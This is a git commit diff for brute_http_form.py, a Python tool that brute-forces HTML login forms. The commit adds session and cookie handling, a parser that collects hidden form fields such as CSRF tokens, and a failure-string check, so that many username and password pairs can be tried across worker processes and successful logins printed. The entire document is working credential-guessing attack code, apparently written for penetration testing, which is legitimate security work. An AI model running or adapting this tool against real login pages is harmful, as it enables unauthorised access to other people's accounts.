245da742e80ae64fbbfb2e4bf852bd8565640f94
Stephen Haywood <stephen@averagesecurityguy.info>
2013-06-19 10:37:19 -0400

    Improved HTML Form processing
    Added support for sessions in case cookies are set on the login
    page.
    Added an HTML parser to find hidden field values and to find the
    failure string.

--- brute_http_form.py
+++ brute_http_form.py
@@ -33,14 +33,50 @@ import sys
 import Queue
 import re
 import json
+import HTMLParser
+
+
+# Class to parse HTML responses to find the needed hidden fields and to test
+# for login success or failure.
+class bruteParser(HTMLParser.HTMLParser):
+    def __init__(self, fail, hidden_fields):
+        HTMLParser.HTMLParser.__init__(self)
+        self.hidden = {}
+        self.hidden_fields = hidden_fields
+        self.fail_regex = fail
+        self.fail = False
+
+    def feed(self, data):
+        # Reset our fail flag before we process any data
+        self.fail = False
+        HTMLParser.HTMLParser.feed(self, data)
+
+    def handle_starttag(self, tag, attr):
+        if tag == 'input':
+            attribs = dict(attr)
+            if attribs['type'] == 'hidden':
+                if attribs['name'] in self.hidden_fields:
+                    self.hidden[attribs['name']] = attribs['value']
+
+    def handle_data(self, data):
+        m = self.fail_regex.search(data)
+
+        # If we have a match, m is not None, on the fail_str then the login
+        # attempt was unsuccessful.
+        if m is not None:
+            self.fail = True
 
 
 def load_config(f):
     return json.loads(open(f).read())
 
 
-def worker(url, cred_queue, success_queue):
+def worker(login, action, parser, cred_queue, success_queue):
     print '[*] Starting new worker thread.'
+    sess = requests.Session()
+    resp = sess.get(login)
+    parser.feed(resp.content)
+
     while True:
         # If there are no creds to test, stop the thread
         try:
@@ -58,13 +94,11 @@ def worker(url, cred_queue, success_queue):
         # and stop the thread.
         auth = {config['ufield']: creds[0],
                 config['pfield']: creds[1]}
-        auth.update(config['hidden'])
-        resp = requests.post(url, data=auth, verify=False)
-        if creds[1] == 'admin':
-            print resp.status_code
-            print resp.headers
-            print resp.content
-        if fail.search(resp.content) is not None:
+        auth.update(parser.hidden)
+        resp = sess.post(action, data=auth, verify=False)
+        parser.feed(resp.content)
+
+        if parser.fail is True:
             print '[-] Failure: {0}/{1}'.format(creds[0], creds[1])
         else:
             print '[+] Success: {0}/{1}'.format(creds[0], creds[1])
@@ -80,16 +114,18 @@ if __name__ == '__main__':
     config = load_config(sys.argv[1])
 
     fail = re.compile(config['fail_str'], re.I | re.M)
-
     cred_queue = multiprocessing.Queue()
     success_queue = multiprocessing.Queue()
     procs = []
 
     # Create one thread for each processor.
     for i in range(int(config['threads'])):
-        p = multiprocessing.Process(target=worker, args=(config['url'],
-                                                         cred_queue,
-                                                         success_queue))
+        p = multiprocessing.Process(target=worker,
+                                    args=(config['login'],
+                                          config['action'],
+                                          bruteParser(fail, config['hidden']),
+                                          cred_queue,
+                                          success_queue))
         procs.append(p)
         p.start()
 
@@ -108,4 +144,3 @@ if __name__ == '__main__':
     while not success_queue.empty():
         user, pwd = success_queue.get()
         print 'User: {0} Pass: {1}'.format(user, pwd)
-
